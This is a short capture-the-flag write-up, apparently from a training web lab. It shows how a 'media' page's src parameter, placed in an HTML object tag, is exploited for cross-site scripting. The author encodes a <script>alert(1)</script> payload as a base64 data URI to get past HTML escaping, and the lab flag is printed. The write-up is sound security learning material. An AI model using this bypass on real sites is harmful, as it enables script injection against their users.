# http://192.168.99.100/index.php?page=media&src=nsa

this flag wasn't as obvious as the previous ones

changing the `src` parameter to anything other than _**nsa**_ generates wrong answer

```sh
e1z2r10p4% curl -s '192.168.99.100/index.php?page=media&src=theQuickBrownFoxJumpsOverTheLazyDog' | grep 'Quick'
<table style="margin-top:-68px;"><center><h2 style="margin-top:50px;"></h2><br/><img src="images/WrongAnswer.gif" alt=""></center> <tr style="background-color:transparent;border:none;"><td style="vertical-align:middle;"><object data="theQuickBrownFoxJumpsOverTheLazyDog"></object></td></tr></table>				</div>
e1z2r10p4% 
e1z2r10p4% curl -s '192.168.99.100/index.php?page=media&src=nsa' | grep 'object'                               
<table style="margin-top:-68px;"><tr style="background-color:transparent;border:none;"><td align=center style="vertical-align:middle;font-size:1.5em;">File: nsa_prism.jpg</td></tr><tr style="background-color:transparent;border:none;"><td style="vertical-align:middle;"><object data="http://192.168.99.100/images/nsa_prism.jpg"></object></td></tr></table>		</div>
e1z2r10p4% 
```

we notice that the `src` parameter value becomes the `data` attribute value of an html `<object>`

if we set `src` to a file name of an image that exists on the server,

the page will display the image, for example `http://192.168.99.100/?page=media&src=/images/05_Lounge.jpg`

how can we exploit that?

setting `src` to javascript directly doesn't work,

for this url:

`http://192.168.99.100/?page=media&src=<script>alert(1)</script>`

the page source is:

`<object data="&lt;script&gt;alert(1)&lt;/script&gt;"></object>`

so the page must be using either `htmlspecialchars()` or `htmlentities()`

how can we get around that?

it turns out we can use **base64** to encode our javascript alert

as per wikipedia article, the format is:

`https://en.wikipedia.org/wiki/Data_URI_scheme`

**`data:[<media type>][;base64],<data>`**

let's try it ...

```sh
e1z2r10p4% echo -n '<script>alert(1)</script>' | base64           
PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
```

`data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==`

full url:

`http://192.168.99.100/?page=media&src=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==`

and when we put that in the browser, we get the flag:

`The flag is : 928d819fc19405ae09921a2b71227bd9aba106f9d2d37ac412e9e5a750f1506d`

#

this one was tricky but i've learned some new things: the data uri scheme, mime types and xss
